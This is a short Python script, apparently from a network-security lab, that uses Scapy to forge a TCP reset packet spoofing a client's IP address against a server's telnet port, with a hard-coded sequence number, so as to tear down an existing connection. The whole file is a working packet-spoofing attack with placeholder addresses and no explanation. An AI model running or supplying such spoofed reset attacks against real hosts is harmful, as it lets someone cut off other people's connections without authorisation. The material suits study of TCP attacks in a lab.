#!/usr/bin/python3
from scapy.all import *
from scapy.layers.inet import *


print("sending reset packet...")
IPLayer = IP(src="CLIENT's IP", dst = "SERVER's IP")
TCPLayer = TCP(sport=46578, dport=23, flags="R", seq=159936073)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt, verbose=0)


